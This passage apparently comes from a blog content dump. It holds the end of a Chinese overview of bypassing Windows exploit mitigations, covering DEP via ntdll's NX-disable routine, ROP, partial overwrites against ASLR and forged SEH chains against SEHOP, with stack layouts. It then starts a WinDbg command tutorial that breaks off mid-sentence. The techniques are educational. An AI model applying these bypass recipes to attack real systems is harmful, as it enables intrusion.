(7c92dc80)</div><div class=\"line\">7c956840 e92865feff      <span class=\"keyword\">jmp</span>     ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x5c</span> (7c93cd6d)</div><div class=\"line\">7c956845 <span class=\"number\">90</span>              <span class=\"keyword\">nop</span></div></pre></td></tr></table></figure></p>\n<p>在这里调用函数ZwSetInformationProcess（），而其参数也刚好达到我们关闭DEP的各项要求.</p>\n<p><strong>6)最后跳转到函数结尾：</strong><br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; u 7c93cd6d</div><div class=\"line\">ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x5c</span>:</div><div class=\"line\">7c93cd6d 5e              <span class=\"keyword\">pop</span>     <span class=\"built_in\">esi</span></div><div class=\"line\">7c93cd6e c9              <span class=\"keyword\">leave</span></div><div class=\"line\">7c93cd6f c20400          <span class=\"keyword\">ret</span>     <span class=\"number\">4</span></div></pre></td></tr></table></figure></p>\n<p>最后的堆栈布局应为：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">【<span class=\"keyword\">AAA</span>……】【<span class=\"built_in\">al</span>=<span class=\"number\">1</span>地址】【<span class=\"number\">0xffffffff</span>】【LdrpCheckNXCompatibility指令地址】【<span class=\"number\">0xffffffff</span>】【<span class=\"string\">\"A\"</span> x <span class=\"number\">54</span>】【<span class=\"keyword\">call</span>/<span class=\"keyword\">jmp</span> <span class=\"built_in\">esp</span>】【shellcode】  </div><div class=\"line\">  ▲ 　　　　  ▲            ▲                       ▲                      ▲            ▲</div><div class=\"line\">填充数据　 返回地址 　 抵消<span class=\"keyword\">ret</span> <span class=\"number\">4</span>的<span class=\"number\">4</span>字节     指令<span class=\"keyword\">cmp</span> <span class=\"built_in\">al</span>,<span class=\"number\">0x1</span> 的起始地址      平衡堆栈   调整NX禁用后的堆栈</div></pre></td></tr></table></figure></p>\n<p>如果在禁用NX后，又需要读取esi或ebp，但此时它们又被我们填充的数据覆盖掉了，那么我们可以使用诸如push esp/pop esi/ret或者push esp/pop ebp/ret这样的指令来调整esi和ebp，以使关闭DEP后还能够正常执行。<br>辅助工具：ImmDbg pycommand插件（!pvefindaddr depxpsp3  + !findantidep）</p>\n<h3 id=\"4-利用WPN与ROP技术\"><a href=\"#4-利用WPN与ROP技术\" class=\"headerlink\" title=\"(4) 利用WPN与ROP技术\"></a>(4) 利用WPN与ROP技术</h3><p>ROP（Return Oriented Programming）:连续调用程序代码本身的内存地址，以逐步地创建一连串欲执行的指令序列。<br>WPM（Write Process Memory）：利用微软在kernel32.dll中定义的函数比如：WriteProcess Memory函数可将数据写入到指定进程的内存中。但整个内存区域必须是可访问的，否则将操作失败。<br>具体实现方法参见我之前翻译的文章《利用WPN与ROP技术绕过DEP》：<a href=\"http://bbs.pediy.com/showthread.php?t=119300\" target=\"_blank\" rel=\"external\">http://bbs.pediy.com/showthread.php?t=119300</a></p>\n<h3 id=\"5-利用SEH-绕过DEP\"><a href=\"#5-利用SEH-绕过DEP\" class=\"headerlink\" title=\"(5) 利用SEH 绕过DEP\"></a>(5) 利用SEH 绕过DEP</h3><p>启用DEP后，就不能使用pop pop ret地址了，因而采用pop reg/pop reg/pop esp/ret 指令的地址，指令 pop esp 可以改变堆栈指针，ret将执行流转移到nseh 中的地址上（用关闭NX 例程的地址覆盖nseh，用指向pop/pop /pop esp/ret 指令的指针覆盖异常处理器）。<br>辅助工具：ImmDbg插件!pvefindaddr</p>\n<h1 id=\"IV、ASLR\"><a href=\"#IV、ASLR\" class=\"headerlink\" title=\"IV、ASLR\"></a>IV、ASLR</h1><h2 id=\"①-原理-3\"><a href=\"#①-原理-3\" class=\"headerlink\" title=\"① 原理\"></a>① 原理</h2><p>ASLR（地址空间布局随机化）技术的主要功能是通过对系统关键地址的随机化，防止攻击者在堆栈溢出后利用固定的地址定位到恶意代码并加以运行。它主要对以下四类地址进行随机化：</p>\n<ul>\n<li>堆地址的随机化；</li>\n<li>栈基址的随机化；</li>\n<li>PE文件映像基址的随机化；</li>\n<li>PEB(Process Environment Block，进程环境块)地址的随机化。</li>\n</ul>\n<p>它在vista,windows 2008 server,windows7下是默认启用的（IE7除外），非系统镜像也可以通过链接选项 /DYNAMICBASE(Visual Studio 2005 SP1 以上的版本，VS2008 都支持)启用这种保护,也可手动更改已编译库的 dynamicbase 位，使其支持ASLR 技术(把PE 头中的DllCharacteristics 设置成0x40 -可以<br>使用工具PE EXPLORER 打开库，查看DllCharacteristics 是否包含0x40 就可以知道是否支持ASLR 技术)。另外，也 可以使用Process Explorer来查看是否开启ASLR。启用ASLR后，即使你原先已经成功构造出exploit，但在系统重启后，你在 exploit中使用的一些固定地址就会被改变，进而导致exploit失效。</p>\n<h2 id=\"②-绕过方法-3\"><a href=\"#②-绕过方法-3\" class=\"headerlink\" title=\"② 绕过方法\"></a>② 绕过方法</h2><h3 id=\"1-覆盖部分返回地址\"><a href=\"#1-覆盖部分返回地址\" class=\"headerlink\" title=\"(1)覆盖部分返回地址\"></a>(1)覆盖部分返回地址</h3><p>对比下windows7系统启动前后OD中loaddll.exe的各模块基址，启动前：<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">可执行模块</div><div class=\"line\">基址       大小         入口       名称       文件版本          路径</div><div class=\"line\">00400000   00060000   00410070   <span class=\"selector-tag\">loaddll</span>                      <span class=\"selector-tag\">D</span>:\\<span class=\"selector-tag\">riusksk</span>\\<span class=\"selector-tag\">TOOL</span>\\<span class=\"selector-tag\">Ollydbg</span>\\<span class=\"selector-tag\">loaddll</span><span class=\"selector-class\">.exe</span></div><div class=\"line\">6<span class=\"selector-tag\">DDE0000</span>   0008<span class=\"selector-tag\">C000</span>   6<span class=\"selector-tag\">DDE1FFF</span>   <span class=\"selector-tag\">AcLayers</span>   6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">AppPatch</span>\\<span class=\"selector-tag\">AcLayers</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">710<span class=\"selector-tag\">E0000</span>   00012000   710<span class=\"selector-tag\">E1200</span>   <span class=\"selector-tag\">mpr</span>        6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">System32</span>\\<span class=\"selector-tag\">mpr</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">71<span class=\"selector-tag\">C50000</span>   00051000   71<span class=\"selector-tag\">C79834</span>   <span class=\"selector-tag\">winspool</span>   6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">System32</span>\\<span class=\"selector-tag\">winspool</span><span class=\"selector-class\">.drv</span></div><div class=\"line\">747<span class=\"selector-tag\">F0000</span>   00017000   747<span class=\"selector-tag\">F1C89</span>   <span class=\"selector-tag\">userenv</span>    6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">System32</span>\\<span class=\"selector-tag\">userenv</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">750<span class=\"selector-tag\">A0000</span>   0001<span class=\"selector-tag\">A000</span>   750<span class=\"selector-tag\">A2CCD</span>   <span class=\"selector-tag\">sspicli</span>    6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">System32</span>\\<span class=\"selector-tag\">sspicli</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">750<span class=\"selector-tag\">C0000</span>   0004<span class=\"selector-tag\">B000</span>   750<span class=\"selector-tag\">C2B6C</span>   <span class=\"selector-tag\">apphelp</span>    6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">System32</span>\\<span class=\"selector-tag\">apphelp</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">75190000   0000<span class=\"selector-tag\">B000</span>   75191992   <span class=\"selector-tag\">profapi</span>    6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">System32</span>\\<span class=\"selector-tag\">profapi</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">75420000   0004<span class=\"selector-tag\">A000</span>   75427<span class=\"selector-tag\">A9D</span>   <span class=\"selector-tag\">KERNELBA</span>   6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">system32</span>\\<span class=\"selector-tag\">KERNELBASE</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">75<span class=\"selector-tag\">B50000</span>   0000<span class=\"selector-tag\">A000</span>   75<span class=\"selector-tag\">B5136C</span>   <span class=\"selector-tag\">LPK</span>        6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">system32</span>\\<span class=\"selector-tag\">LPK</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">75<span class=\"selector-tag\">B60000</span>   0004<span class=\"selector-tag\">E000</span>   75<span class=\"selector-tag\">B6EC49</span>   <span class=\"selector-tag\">GDI32</span>      6<span class=\"selector-class\">.1</span><span class=\"selector-class\">.7600</span><span class=\"selector-class\">.16385</span> (  <span class=\"selector-tag\">C</span>:\\<span class=\"selector-tag\">Windows</span>\\<span class=\"selector-tag\">system32</span>\\<span class=\"selector-tag\">GDI32</span><span class=\"selector-class\">.dll</span></div><div class=\"line\">……</div></pre></td></tr></table></figure></p>\n<p>启动后：<br><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">可执行模块</div><div class=\"line\">基址         大小       入口       名称       文件版本          路径</div><div class=\"line\"><span class=\"number\">00400000</span>   <span class=\"number\">00060000</span>   <span class=\"number\">00410070</span>   loaddll                      D:\\riusksk\\TOOL\\Ollydbg\\loaddll.exe</div><div class=\"line\">6F510000   <span class=\"number\">0008C000</span>   6F511FFF   AcLayers   <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\AppPatch\\AcLayers.dll</div><div class=\"line\"><span class=\"number\">715B0000</span>   <span class=\"number\">00012000</span>   <span class=\"number\">715B1200</span>   mpr        <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\System32\\mpr.dll</div><div class=\"line\"><span class=\"number\">72170000</span>   <span class=\"number\">00051000</span>   <span class=\"number\">72199834</span>   winspool   <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\System32\\winspool.drv</div><div class=\"line\">74C70000   <span class=\"number\">00017000</span>   74C71C89   userenv    <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\System32\\userenv.dll</div><div class=\"line\"><span class=\"number\">75520000</span>   <span class=\"number\">0001A000</span>   75522CCD   sspicli    <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\System32\\sspicli.dll</div><div class=\"line\"><span class=\"number\">75540000</span>   <span class=\"number\">0004B000</span>   75542B6C   apphelp    <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\System32\\apphelp.dll</div><div class=\"line\"><span class=\"number\">75610000</span>   <span class=\"number\">0000B000</span>   <span class=\"number\">75611992</span>   profapi    <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\System32\\profapi.dll</div><div class=\"line\"><span class=\"number\">75690000</span>   <span class=\"number\">0004A000</span>   75697A9D   KERNELBA   <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\system32\\KERNELBASE.dll</div><div class=\"line\"><span class=\"number\">759B0000</span>   <span class=\"number\">000CC000</span>   759B168B   msctf      <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\System32\\msctf.dll</div><div class=\"line\"><span class=\"number\">75E60000</span>   <span class=\"number\">000AC000</span>   75E6A472   msvcrt     <span class=\"number\">7.0</span>.7600.16385 (  C:\\Windows\\system32\\msvcrt.dll</div><div class=\"line\">75F10000   <span class=\"number\">0004E000</span>   75F1EC49   GDI32      <span class=\"number\">6.1</span>.7600.16385 (  C:\\Windows\\system32\\GDI32.dll</div><div class=\"line\">……</div></pre></td></tr></table></figure></p>\n<p>由此可见，各模块基址的高位是随机变化的，而低位是固定不变的，这里loaddll.exe不受ADSL保护，所以其基址没有随机化，如果是 Notepad.exe就有启用ASLR，还有其它经链接选项/DYNAMICBASE编译的程序也会启用ASLR。因此我们可以让填充字符只覆盖到返回 地址的一半，由于小端法机器的缘故，其低位地址在前，因此覆盖到的一半地址刚好处于低位，而返回地址的高位我们让它保持不变，所以我们必须在返回地址之前 的地址范围内（相当于漏洞函数所在的255字节空间地址）查找出一个可跳转到shellcode的指令，比如jmp edx(关键看哪一寄存器指向 shellcode)。除此之外，我们还必须将shellcode放在返回地址之前，不然连返回地址的高位也覆盖掉了，这是不允许的。纵观此法，相当的有 局限性，如果漏洞函数过短，可能就没有我们需要的指令了，这时就得另寻他法了。</p>\n<h3 id=\"2-利用未启用ASLR的模块地址\"><a href=\"#2-利用未启用ASLR的模块地址\" class=\"headerlink\" title=\"(2)利用未启用ASLR的模块地址\"></a>(2)利用未启用ASLR的模块地址</h3><p>这与之前绕过SafeSEH的方法类似，直接在未受ASLR保护的模块中查找跳转指令的地址来覆盖返回地址或者SEH结构，可以通过 Process Explorer或者ImmDbg命令插件!ASLRdynamicbase或者(!pvefindaddr noaslr)：来查看哪 些进程模块启用ASLR保护。</p>\n<h1 id=\"V、SEHOP\"><a href=\"#V、SEHOP\" class=\"headerlink\" title=\"V、SEHOP\"></a>V、SEHOP</h1><h2 id=\"①-原理-4\"><a href=\"#①-原理-4\" class=\"headerlink\" title=\"① 原理\"></a>① 原理</h2><p>微软在Microsoft Windows 2008 SP0、Microsoft Windows Vista SP1和 Microsoft Windows 7中加入了另一种新的保护机制 SEHOP（Structured Exception Handling Overwrite Protection），它可作为SEH的扩展，用于检 测SEH是否被覆写。SEHOP的核心特性是用于检测程序栈中的所有SEH结构链表的完整性，特别是对最后一个SHE结构的检测。在最后一个SEH结构中 拥有一个特殊的异常处理函数指针，指向一个位于ntdll中的函数ntdll!FinalExceptHandler（）。当我们用 jmp 06 pop pop ret 来覆盖SEH结构后，由于SEH结构链表的完整性遭到破坏，SEHOP就能检测到异常从而阻止shellcode 的运行</p>\n<h2 id=\"②-绕过方法-4\"><a href=\"#②-绕过方法-4\" class=\"headerlink\" title=\"② 绕过方法\"></a>② 绕过方法</h2><p>伪造SEH链表<br>由于SEHOP会检测SEH链表的完整性，那么我们可以通过伪造SEH链表来替换原先的SEH链表，进而达到绕过的目的。具体实现方法：</p>\n<ul>\n<li>（1）查看SEH链表结构，可借助OD实现，然后记住最后一个SEH结构地址，以方便后面的利用；</li>\n<li>（2）用JE(0x74) + 最后一个SEH结构的地址（由于地址开头是00，故可省略掉，可由0x74替代，共同实现4字节对齐）去覆盖nexSEH；</li>\n<li>（3）用xor pop pop ret指令地址去覆盖SEH handle，其中的xor指令是用于将ZF置位，使前面的JE = JMP指令，进而实现跳转；</li>\n<li>（4）在这两个SEH结构之前写入一跳转指令（JMP+8），以避免数据段被执行；</li>\n<li>（5）在这两个SEH结构之间全部用NOP填充，如果两者之间还有其它SEH结构的话；（6）将shellcode放置在最后一个SEH结构之后，即ntdll!FinalExceptHandler（）函数之后。</li>\n</ul>\n<p>此时的堆栈布局如下：<br><figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">【<span class=\"keyword\">NOP</span>…】【<span class=\"keyword\">JMP</span> <span class=\"number\">08</span>】【JE XXXXXX】【xor <span class=\"keyword\">pop</span> <span class=\"keyword\">pop</span> <span class=\"keyword\">ret</span>】【<span class=\"keyword\">NOP</span>…】【<span class=\"keyword\">JMP</span> <span class=\"number\">08</span>】【<span class=\"number\">0xFFFFFFFF</span>】【ntdll!FinalExceptHandler】【shellcode】</div><div class=\"line\">                        ▲              ▲                                  ▲                   ▲ </div><div class=\"line\">           next <span class=\"keyword\">SEH</span>(指向<span class=\"number\">0xffffffff</span>)  <span class=\"keyword\">SEH</span> Handle                          next <span class=\"keyword\">SEH</span>           <span class=\"keyword\">SEH</span> Handle</div></pre></td></tr></table></figure></p>\n<p>更多信息可参见我之前翻译的《绕过SEHOP安全机制》：<a href=\"http://bbs.pediy.com/showthread.php?t=104707\" target=\"_blank\" rel=\"external\">http://bbs.pediy.com/showthread.php?t=104707</a></p>\n<h1 id=\"Ⅵ、结论\"><a href=\"#Ⅵ、结论\" class=\"headerlink\" title=\"Ⅵ、结论\"></a>Ⅵ、结论</h1><p>本文简单地叙述了windows平台上的各类溢出保护机制及其绕过方法，但若结合实例分析的话，没有几万字是不可能完成的，因此这里概览一番，读者若想获 得相关的实例运用的资料，可参考文中提及一些paper，特别是由看雪论坛上dge兄弟翻译的《Exploit编写系列教程6》以及黑客杂志 《Phrack》、《Uninformed》上的相关论文。微软与黑客之间的斗争是永无休止的，我们期待着下一项安全机制的出现……</p>\n"},{"title":"Windbg命令","url":"http://huirong.github.io/2015/09/15/WindbgCommand/","content":"<p>本文并非原创，转载自<a href=\"http://drops.wooyun.org/tips/6813\" target=\"_blank\" rel=\"external\">Exploit开发系列教程-Windbg</a><br><a id=\"more\"></a></p>\n<p>##符号<br>打开某一WinDbg实例，如果你正使用Windbg调试某一进程，那么关闭WinDbg并将它重新打开。在File→Symbol File Path 里</p>\n<p>输入：<font color=\"red\"><code>SRV\\*C:\\windbgsymbols\\*http://msdl.microsoft.com/download/symbols</code> </font></p>\n<p>保存工作区 (File→Save Workspace).</p>\n<p>如上的星号是定义符。如上指定目录为本地符号缓存目录。paths/urls位于第二个星号后（如果有更多的paths/urls，那么使用‘；’分割）。用星号具体指定符号的位置。</p>\n<p>##调试时调价符号<br>要在调试时追加符号的搜索路径,使用命令：<font color=\"red\">.sympath+ c:\\symbolpath</font></p>\n<p>(使用的命令如没有’+’,其作用是替换默认的搜索路径)</p>\n<p>重载符号表: <font color=\"red\">.reload</font></p>\n<p>##检查符号<br>如果需要了解模块加载了哪些符号，使用命令：<font color=\"red\">x *!</font></p>\n<p>X命令支持使用通配符并可在搜索一个或多个模块中的符号时使用.例如，我们可以搜索kernel32内带有virtual字样开头的所有符号：</p>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; x kernel32!virtual*</div><div class=\"line\"><span class=\"number\">757</span>d4b5f          kernel32!VirtualQueryExStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">7576</span>d950          kernel32!VirtualAllocExStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757</span>f66f1          kernel32!VirtualAllocExNuma (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757</span>d4b4f          kernel32!VirtualProtectExStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757542</span>ff          kernel32!VirtualProtectStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">7576</span>d975          kernel32!VirtualFreeEx (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">7575184</span>b          kernel32!VirtualFree (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">75751833</span>          kernel32!VirtualAlloc (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757543</span>ef          kernel32!VirtualQuery (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757510</span><span class=\"built_in\">c8</span>          kernel32!VirtualProtect (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757</span>ff14d          kernel32!VirtualProtectEx (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">7575183</span>e          kernel32!VirtualFreeStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">75751826</span>          kernel32!VirtualAllocStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">7576</span>d968          kernel32!VirtualFreeExStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757543</span>fa          kernel32!VirtualQueryStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">7576</span>eee1          kernel32!VirtualUnlock (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">7576</span>ebdb          kernel32!VirtualLock (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">7576</span>d95d          kernel32!VirtualAllocEx (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757</span>d4b3f          kernel32!VirtualAllocExNumaStub (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div><div class=\"line\"><span class=\"number\">757</span>ff158          kernel32!VirtualQueryEx (&lt;no parameter <span class=\"meta\">info</span>&gt;)</div></pre></td></tr></table></figure>\n<p>在模块部分使用通配符：<br><figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; x *!messagebox*</div><div class=\"line\"><span class=\"number\">7539</span>fbd1          USER32!MessageBoxIndirectA (&lt;no parameter info&gt;)</div><div class=\"line\"><span class=\"number\">7539</span>fcfa          USER32!MessageBoxExW (&lt;no parameter info&gt;)</div><div class=\"line\"><span class=\"number\">7539</span>f7af          USER32!MessageBoxWorker (&lt;no parameter info&gt;)</div><div class=\"line\"><span class=\"number\">7539</span>fcd6          USER32!MessageBoxExA (&lt;no parameter info&gt;)</div><div class=\"line\"><span class=\"number\">7539</span>fc9d          USER32!MessageBoxIndirectW (&lt;no parameter info&gt;)</div><div class=\"line\"><span class=\"number\">7539</span>fd1e          USER32!MessageBoxA (&lt;no parameter info&gt;)</div><div class=\"line\"><span class=\"number\">7539</span>fd3f          USER32!MessageBoxW (&lt;no parameter info&gt;)</div><div class=\"line\"><span class=\"number\">7539</span>fb28          USER32!MessageBoxTimeoutA (&lt;no parameter info&gt;)</div><div class=\"line\"><span class=\"number\">7539</span>facd          USER32!MessageBoxTimeoutW (&lt;no parameter info&gt;)</div></pre></td></tr></table></figure></p>\n<p>如想临时改变策略,立刻将所有模块的符号加载到WinDbg调试器，可以使用：<font color=\"red\">ld*</font></p>\n<p>这可能会花去一段时间.可通过 Debug→Break 来停止调试。</p>\n<p>##帮助<br>仅需输入<font color=\"red\">.hh</font>或按F1打开帮助窗口。用以下命令得到指定命令的帮助信息：<br><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">.hh &lt;<span class=\"keyword\">command</span>&gt;</div></pre></td></tr></table></figure></p>\n<font color=\"red\"><command></font>为你想得到帮助信息的某个指定命令,或按F1，选择Index(索引)来搜索命令，从而得到其帮助信息.<br><br>## 调试模式 ##<br><br>### 本地调试 ###<br>可以调试某一新进程或某一正在运行的进程:<br><br>通过<font color=\"red\">File→Open Executable</font>运行新进程以进行调试<br><br>通过<font color=\"red\">File→Attach to a Process</font>附加到某一正运行的进程<br><br>###远程调试<br><br>至少使用如下两个选项来远程调试程序<br><br>1 如果你已在机器A上本地调试某一程序,那么使用如下命令(选择你想要的端口):<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-class\">.server</span> tcp:port=<span class=\"number\">1234</span></div></pre></td></tr></table></figure><br><br>此时开启服务器（WinDbg内）.转到 <font color=\"red\">File→Connect to Remote Sessions</font>并输入：<br><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">tcp:</span>Port=<span class=\"number\">1234</span>,Server=<span class=\"params\">&lt;IP of Machine A&gt;</span></div></pre></td></tr></table></figure><br><br>来指定端口和IP.<br><br>2 在机器A,用如下命令运行dbgsrv：<br><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dbgsrv.exe -<span class=\"built_in\">t</span> <span class=\"built_in\">t</span><span class=\"symbol\">cp:po</span>rt=<span class=\"number\">1234</span></div></pre></td></tr></table></figure><br><br>即可以在机器A启动服务器.<br><br>在机器B运行Windbg，接着 <font color=\"red\">File→Connect to Remote Stub</font>，输入<br><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">tcp:</span>Port=<span class=\"number\">1234</span>,Server=<span class=\"params\">&lt;IP of Machine A&gt;</span></div></pre></td></tr></table></figure><br><br>这里需要设置适当的参数。<br><br>你将看到 <font color=\"red\">File→Open Executable</font>已无法选择，但你可以通过 <font color=\"red\">File→Attach to a process</font>附加到进程 .这时可在机器A上看到进程列表。<br><br>如果要在机器A停止服务器，可用Task Manager（任务管理器）接着kill dbgsrv.exe。<br><br>##模块<br>当你加载某一可执行程序或附加到某一进程时,WinDbg将列出已加载的模块.如果你要再次列出模块,那么可输入：lmf 列出指定模块（ntdll.dll），可用: <font color=\"red\">lmf m ntdll</font> 得到模块（ntdll.dll）的镜像头部信息: <font color=\"red\">!dh ntdll</font>\n\n<p>带有‘!’符号的命令为扩展命令，这里的作用是显示指定模块的详细信息,等等。从某一外部DLL中导出某一外部命令，并且WinDbg内部会调用该命令。用户可创建他们自己的扩展程序来扩展WinDbg的功能。</p>\n<p>当然了，你也可以使用模块的起始地址:<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; lmf m ntdll</div><div class=\"line\">start    <span class=\"keyword\">end</span>        <span class=\"class\"><span class=\"keyword\">module</span> <span class=\"title\">name</span></span></div><div class=\"line\"><span class=\"number\">77790000</span> <span class=\"number\">77910000</span>   ntdll    ntdll.dll</div><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; !dh <span class=\"number\">77790000</span></div></pre></td></tr></table></figure></p>\n<p>##表达式<br>WinDbg支持使用表达式,这意味着，当需要某一值时,你可直接输入该值或输入与该值等价的表达式。例如，如果 EIP = <font color=\"red\">77c6cb70</font>,那么 <font color=\"red\">bp 77c6cb71</font> 和 <font color=\"red\">bp EIP+1</font> 